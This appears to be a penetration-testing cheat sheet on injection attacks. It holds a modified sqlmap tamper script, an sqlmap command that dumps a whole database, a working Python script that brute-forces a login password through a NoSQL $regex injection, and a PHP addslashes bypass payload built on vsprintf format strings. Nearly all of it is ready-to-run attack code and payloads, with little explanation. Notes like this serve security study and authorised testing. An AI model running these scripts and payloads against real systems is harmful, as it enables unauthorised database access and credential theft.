# SQL Injection

### SQLMap

Modify unicode encoding in "/usr/share/sqlmap/tamper/charunicodeencode.py":

```python
while i < len(payload):
  if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
      retVal += "\\u00%s" % payload[i + 1:i + 3]
      i += 3
  else:
      retVal += '\\u%.4X' % ord(payload[i])
      i += 1
```

#### Connect with Credentials

```text
sqlmap -d "mysql://<user>:<password>@<ip>/<database>" --dump 
```

### NoSQL

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

Retrieve password:

```python
#!/usr/bin/env python3
import re
import requests
import string

chars = string.ascii_letters + string.digits + string.punctuation
password = ""
url = ""
done = False

while not done:
    done = True
    for c in chars:
        data = {
            "username": "",
            "password[$regex]": f"^{re.escape(password+c)}.*$",
            "login": "login"
        }
        r = requests.post(url, data=data, allow_redirects=False)
        if r.status_code == 302:     
            done = False       
            password += c
            print(f"[+] Found {c}")
print(f"[+] Password: {password}")
```

### PHP addslashes bypass using vsprintf

If vsprintf is used we can send the query like this \(replace \* with your injection\):

```text
xxx%1$\%27)*
```

